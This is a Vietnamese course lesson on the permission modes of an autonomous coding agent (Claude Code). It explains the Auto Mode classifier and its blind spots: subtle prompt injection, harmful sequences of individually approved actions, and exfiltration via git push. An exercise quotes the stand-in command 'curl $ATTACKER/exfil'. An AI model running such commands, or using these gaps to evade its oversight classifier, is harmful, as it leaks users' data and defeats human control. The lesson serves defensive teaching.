# Các chế độ cấp quyền cho tác tử tự chủ

> Thang bậc cấp quyền (permission ladder) — các cấp độ tự chủ được phân cấp từ việc kiểm duyệt từng hành động đơn lẻ cho đến tự động phê duyệt tất cả — là cơ chế mà một khung điều phối (harness) sử dụng để quản trị những gì một tác tử tự chủ được phép thực hiện mà không cần hỏi ý kiến con người. Claude Code, nghiên cứu điển hình trong bài học này, cung cấp sáu chế độ như vậy: `plan` hỏi ý kiến trước mọi hành động, `default` (gắn nhãn "Manual" trên giao diện người dùng) chỉ hỏi khi gặp các hành vi tiềm ẩn rủi ro, `acceptEdits` tự động chấp thuận ghi tệp nhưng vẫn yêu cầu xác nhận khi thực thi lệnh shell, và `bypassPermissions` phê duyệt toàn bộ. Chế độ Tự động (Auto Mode — chế độ quyền `auto`) thay thế việc phê duyệt thủ công từng hành động bằng một mô hình phân loại riêng biệt (classifier model), mô hình này sẽ rà soát từng hành động trước khi chạy và ngăn chặn bất kỳ hành vi nào leo thang vượt quá phạm vi yêu cầu ban đầu. Ngân sách hành động được áp đặt chặt chẽ thông qua `max_turns` và `max_budget_usd`. Việc có được quyền sử dụng chế độ `auto` hay không phụ thuộc vào gói thuê bao, chính sách bật tính năng của tổ chức, loại mô hình và nhà cung cấp — và Anthropic đã nhấn mạnh rõ ràng rằng chỉ riêng mô hình phân loại là chưa đủ để đảm bảo an toàn tuyệt đối.

**Loại bài học:** Tìm hiểu (Learn)
**Ngôn ngữ:** Python (stdlib, bộ mô phỏng bộ phân loại hai giai đoạn)
**Điều kiện tiên quyết:** Phase 15 · 01 (Tác tử chân trời dài hạn), Phase 15 · 09 (Toàn cảnh tác tử lập trình)
**Thời gian:** ~45 phút

## Vấn đề thực tế

Một tác tử lập trình tự chủ chạy trực tiếp trên máy tính của bạn thuộc về một danh mục bảo mật hoàn toàn khác biệt. Bề mặt tấn công (attack surface) bao gồm tất cả những gì tác tử có thể chạm tới — hệ thống tệp, mạng internet, thông tin định danh xác thực (credentials), bộ nhớ tạm (clipboard), bất kỳ tab trình duyệt nào, và bất kỳ cửa sổ dòng lệnh (terminal) nào đang mở. Bruce Schneier cùng nhiều chuyên gia đã công khai cảnh báo: các tác tử sử dụng máy tính (computer-use agents) không đơn thuần là một "bản cập nhật tính năng" của chatbot, chúng là một loại công cụ mới với hồ sơ rủi ro hoàn toàn mới.

Hệ thống cấp quyền của Claude Code là câu trả lời từ Anthropic. Thay vì chỉ có một công tắc nhị phân "tự chủ / không tự chủ", hệ thống cung cấp sáu chế độ trải dài trên một thang bậc năng lực: plan → default → acceptEdits → … → bypassPermissions. Mỗi chế độ đại diện cho một sự đánh đổi khác nhau giữa tốc độ thực thi và mức độ kiểm duyệt trên từng hành động. Chế độ Auto Mode (tháng 3 năm 2026) bổ sung một mô hình phân loại riêng biệt nhằm đưa việc phê duyệt ra khỏi đường dẫn xung yếu (critical path) của người dùng: nó rà soát từng hành động trước khi chạy và chặn đứng bất kỳ hành động nào leo thang vượt ra ngoài yêu cầu.

Câu hỏi kỹ thuật đặt ra: hệ thống này ngăn chặn được những gì, bỏ sót những gì, và một tác vụ cụ thể thực sự đòi hỏi chế độ cấp quyền nào?

## Khái niệm cốt lõi

### Sáu chế độ cấp quyền

| Chế độ | Hành vi | Khi nào nên sử dụng |
|---|---|---|
| `plan` | Tác tử đề xuất một kế hoạch; người dùng phê duyệt toàn bộ kế hoạch; từng hành động đều được xem xét lại trước khi thực thi | Tác vụ chưa quen thuộc; mã nguồn tiệm cận môi trường sản xuất; lần đầu tiên chạy tác tử trên một kho mã |
| `default` | Được gắn nhãn "Manual" trên giao diện người dùng. Tác tử thực thi các hành động thông thường; hỏi người dùng trước bất kỳ hành động "rủi ro" nào (chạy shell, thao tác phá hủy dữ liệu, gọi mạng) | Hầu hết các phiên lập trình tương tác |
| `acceptEdits` | Các thao tác ghi tệp được tự động phê duyệt; chạy shell và gọi mạng vẫn yêu cầu xác nhận | Đợt tái cấu trúc mã (refactoring) trên quy mô nhiều tệp |
| `auto` | Một mô hình phân loại riêng biệt rà soát từng hành động trước khi chạy; chặn bất kỳ hành vi nào leo thang vượt quá yêu cầu | Các tác vụ chạy nền chân trời dài hạn không có người giám sát trong không gian làm việc bị giới hạn |
| `dontAsk` | Không bao giờ nhắc hỏi; các hành động không được phê duyệt trước bởi quy tắc cấp quyền sẽ bị từ chối | Các sandbox tạm thời (ephemeral sandboxes), công việc CI, kịch bản nghiên cứu |
| `bypassPermissions` | Tự động phê duyệt tất cả | Được tài liệu hóa là "chỉ sử dụng bên trong các container tạm thời mà bạn sẵn sàng loại bỏ hoàn toàn" |

(Tên gọi ở trên khớp với tài liệu công khai của Claude Code; giao diện người dùng hiển thị nhãn cho `default` là "Manual".)

### Tóm lược về Chế độ Tự động (Auto Mode)

Auto Mode (ra mắt ngày 24 tháng 3 năm 2026) là chế độ cấp quyền đầu tiên ủy thác việc phê duyệt từng hành động cho một mô hình AI. Cấu trúc:

1. **Một mô hình phân loại riêng biệt.** Đánh giá mọi hành động được đề xuất trước khi chạy dựa trên tác vụ đã khai báo và trạng thái hiện tại của phiên làm việc, đồng thời chặn bất kỳ hành động nào leo thang vượt quá những gì yêu cầu đòi hỏi. Các hành động bị chặn sẽ được chuyển tiếp về cho người dùng quyết định.
2. **Khả năng sử dụng có kiểm soát.** Việc chế độ `auto` có xuất hiện hay không tùy thuộc vào gói đăng ký, quyền cho phép của tổ chức, loại mô hình và nhà cung cấp.

Các cơ chế kiểm soát ngân sách vận hành song song với bộ phân loại:

- `max_turns` — tổng số lần lặp tối đa trong một phiên.
- `max_budget_usd` — giới hạn trần chi phí bằng tiền để hủy bỏ phiên làm việc.
- Giới hạn số lần hành động trên mỗi công cụ (không được gọi quá N lần `WebFetch`, v.v.).

### Những gì hệ thống phát hiện và ngăn chặn được

- Các cuộc tấn công chèn mã lệnh vào lời nhắc (prompt injection) trực diện trong đầu vào của công cụ, nơi chỉ thị bị chèn khớp với một dạng hành động rủi ro đã biết.
- Các vòng lặp công cụ lặp đi lặp lại vô nghĩa — bộ phân loại có thể nhận biết hành động thứ N+1 gần như trùng khớp hoàn toàn với hành động thứ N trong năm lần liên tiếp.
- Các lệnh shell hoàn toàn nằm ngoài phạm vi trong một phiên làm việc vốn chỉ thao tác chỉnh sửa tệp thuần túy.

### Những gì hệ thống có thể bỏ sót

- **Chèn mã lệnh gián tiếp tinh vi (Subtle prompt injection)** làm biến đổi hành vi tổng thể mà không tạo ra bất kỳ hành động đơn lẻ nào bị gắn cờ cảnh báo. Chèn mã gián tiếp không phải là một lỗ hổng có thể vá triệt để bằng mã (trưởng bộ phận chuẩn bị của OpenAI, 2025, khi nhận định về các tác tử trình duyệt — xem Bài 11).
- **Hành vi sai trái ở cấp độ ngữ nghĩa.** Từng hành động riêng lẻ đều có thể trông vô hại, nhưng quỹ đạo khi ghép nối lại thì gây nguy hại nghiêm trọng. Bộ phân loại chỉ đánh giá từng hành động cục bộ; nó không suy diễn lại toàn bộ ý định sâu xa của người dùng.
- **Rò rỉ dữ liệu qua các kênh hợp pháp (Exfiltration through legitimate channels).** Ghi dữ liệu vào một tệp bạn sở hữu, sau đó chạy lệnh `git push` lên một kho lưu trữ công khai, là một chuỗi các hành động hoàn toàn được phép nhưng sự kết hợp của chúng mới là vấn đề phá hoại.

### Định hình phiên bản thử nghiệm nghiên cứu (Research preview)

Anthropic phát hành Auto Mode dưới dạng bản thử nghiệm nghiên cứu (research preview). Tài liệu nêu rõ rằng bộ phân loại chỉ là một lớp bảo vệ chứ không phải giải pháp toàn diện: người dùng được yêu cầu phải kết hợp Auto Mode với hạn mức ngân sách, danh sách cho phép (allowlists), không gian làm việc cô lập và kiểm toán quỹ đạo (Bài 12–16). Cách định vị này cũng phản ánh khoảng cách giữa đánh giá lý thuyết và triển khai thực tế đã được tài liệu hóa (Bài 1) — một bộ phân loại vượt qua các bài đánh giá ngoại tuyến vẫn có thể hành xử khác biệt trong một phiên làm việc thực tế nơi ngữ cảnh của người dùng có nhiều điểm mơ hồ.

### Thang bậc này nằm ở đâu trong quy trình làm việc của bạn

- Tác vụ chưa quen: bắt đầu ở chế độ `plan`. Việc đọc lướt kế hoạch luôn ít tốn kém hơn nhiều so với việc phải hoàn tác một chu trình chạy sai lệch.
- Đợt tái cấu trúc mã đã định hình rõ: `acceptEdits` giúp bạn tiết kiệm hàng loạt thao tác bấm chuột xác nhận.
- Chu trình chạy nền không người giám sát: chỉ dùng `auto` bên trong một không gian làm việc mà bạn đã đo lường chính xác bán kính tác động (blast radius) (không chứa thông tin xác thực, không gắn kết ổ đĩa sản xuất, không mở các cổng mạng ngoài ý muốn).
- Container dùng một lần: `dontAsk` / `bypassPermissions` chỉ được chấp nhận nếu và chỉ nếu container đó và các thông tin xác thực trong nó là hoàn toàn có thể vứt bỏ.

```figure
autonomy-oversight
```

## Sử dụng trong thực tế

Tệp `code/main.py` mô phỏng một bộ phân loại kiểm duyệt hành động dưới dạng đường ống hai giai đoạn — đây là một mô hình đơn giản hóa phục vụ mục đích sư phạm; chế độ `auto` thực tế được vận hành bởi một mô hình phân loại riêng biệt, chứ không phải một hợp đồng hai giai đoạn được công bố. Giai đoạn 1 là một quy tắc từ khóa chi phí thấp kiểm tra các hành động được đề xuất; Giai đoạn 2 là một bộ kiểm duyệt đa quy tắc xử lý chậm hơn. Trình điều khiển đưa vào một quỹ đạo nhân tạo ngắn (các hành động an toàn, một nỗ lực chèn mã độc, một vòng lặp thừa thãi) và chỉ ra các điểm mà bộ phân loại bắt được cũng như những điểm nó bỏ sót.

## Đóng gói sản phẩm

Tệp `outputs/skill-permission-mode-picker.md` giúp khớp mô tả tác vụ với chế độ cấp quyền phù hợp, trần ngân sách và mức độ cô lập bắt buộc.

## Bài tập

1. Chạy `code/main.py`. Loại hành động nhân tạo nào không bao giờ bị Giai đoạn 1 gắn cờ nhưng luôn bị bắt bởi Giai đoạn 2? Loại hành động nào lọt qua cả hai giai đoạn?

2. Mở rộng tập quy tắc của Giai đoạn 1 để bắt một dạng mã độc cụ thể đã biết (ví dụ: `curl $ATTACKER/exfil`). Đo lường tỷ lệ dương tính giả (false-positive rate) trên mẫu hành động lành tính.

3. Đọc tài liệu "How the agent loop works" của Anthropic. Liệt kê mọi trạng thái bên ngoài mà tác tử chạm tới theo mặc định ở chế độ `default`. Trạng thái nào bạn cần phải đặt cổng kiểm soát riêng trước khi chạy `auto` không người giám sát?

4. Thiết kế một ngân sách chạy không giám sát trong 24 giờ: `max_turns`, `max_budget_usd`, giới hạn trần trên từng công cụ, danh sách cho phép. Hãy biện minh cho từng con số.

5. Mô tả một quỹ đạo mà trong đó mọi hành động riêng lẻ đều được bộ phân loại phê duyệt, nhưng hành vi tổng thể khi kết hợp lại bị mất tính tương thích. (Bài 14 sẽ giải thích cách công tắc ngắt khẩn cấp và token cảnh báo can thiệp xử lý vấn đề này).

## Thuật ngữ chính

| Thuật ngữ | Mọi người thường nói | Ý nghĩa thực tế |
|---|---|---|
| Permission mode | "Mức độ tác tử có thể làm" | Một trong sáu chính sách được định danh kiểm soát việc phê duyệt trên từng hành động |
| plan mode | "Hỏi trước mọi thứ" | Tác tử viết kế hoạch; người dùng phê duyệt trước khi thực thi |
| acceptEdits | "Cho phép ghi tệp" | Ghi tệp được tự động phê duyệt; chạy lệnh shell vẫn yêu cầu xác nhận |
| auto | "Tự động phê duyệt" | Mô hình phân loại riêng biệt rà soát từng hành động; chặn hành vi leo thang vượt quá yêu cầu |
| bypassPermissions | "Cho phép toàn bộ" | Phê duyệt tất cả; chỉ dành riêng cho các container tạm thời dùng một lần |
| Stage 1 (simulator) | "Kiểm tra từ khóa nhanh" | Quy tắc đơn giản chi phí thấp áp dụng trên các hành động đề xuất trong `code/main.py` |
| Stage 2 (simulator) | "Kiểm duyệt chuyên sâu" | Bộ kiểm duyệt đa quy tắc xử lý chậm hơn dành cho các hành động bị gắn cờ trong `code/main.py` |
| Research preview | "Chưa phát hành chính thức (GA)" | Cách Anthropic định hình các tính năng mà phương thức thất bại vẫn đang được tiếp tục nghiên cứu |

## Đọc thêm

- [Anthropic — Cách vòng lặp tác tử hoạt động](https://code.claude.com/docs/en/agent-sdk/agent-loop) — các chế độ cấp quyền, ngân sách, định dạng hành động.
- [Anthropic — Tổng quan về Claude Managed Agents](https://platform.claude.com/docs/en/managed-agents/overview) — mô hình thực thi dịch vụ được quản lý.
- [Anthropic — Trang sản phẩm Claude Code](https://www.anthropic.com/product/claude-code) — bề mặt tính năng và thông báo về Auto Mode.
- [Anthropic — Hiến pháp của Claude (Tháng 1 năm 2026)](https://www.anthropic.com/news/claudes-constitution) — tầng lập luận định hình các phán đoán của bộ phân loại.
- [Anthropic — Đo lường quyền tự chủ của tác tử trong thực tế](https://www.anthropic.com/research/measuring-agent-autonomy) — góc nhìn nội bộ về thiết kế cấp quyền cho các tác vụ chân trời dài hạn.
